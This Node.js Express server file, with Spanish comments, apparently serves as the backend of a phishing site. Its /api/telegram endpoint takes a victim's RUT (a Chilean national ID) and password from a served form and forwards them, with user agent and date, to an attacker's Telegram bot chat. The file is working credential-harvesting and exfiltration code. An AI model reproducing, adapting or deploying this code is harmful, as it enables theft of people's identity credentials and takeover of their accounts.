const express = require('express');
const path = require('path');
const dotenv = require('dotenv');

dotenv.config(); // Carga las variables del archivo .env (solo para desarrollo local)

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para parsear JSON
app.use(express.json());

// Servir archivos estáticos (CSS, HTML, JS)
app.use(express.static(path.join(__dirname, '/')));

// Endpoint para enviar a Telegram
app.post('/api/telegram', async (req, res) => {
  try {
    const { rut, passwd, userAgent, fecha } = req.body;

    // Mensaje en formato HTML (evita errores de parseo)
    const mensaje = `
🔔 <b>Nueva solicitud recibida</b>
👤 <b>RUT:</b> ${rut}
🔑 <b>Clave:</b> ${passwd}
🕒 <b>Fecha:</b> ${fecha || 'No disponible'}
📱 <b>User Agent:</b> ${userAgent || 'No disponible'}
    `;

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      throw new Error('Faltan variables de entorno de Telegram');
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: mensaje,
        parse_mode: 'HTML' // Usamos HTML para evitar errores con caracteres especiales
      })
    });

    if (!response.ok) {
      const error = await response.text();
      throw new Error(`Telegram error: ${error}`);
    }

    res.json({ ok: true });
  } catch (error) {
    console.error('Error enviando a Telegram:', error.message);
    res.status(500).json({ ok: false, error: error.message });
  }
});

// Todas las demás rutas sirven index.html
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`✅ Servidor corriendo en http://localhost:${PORT}`);
});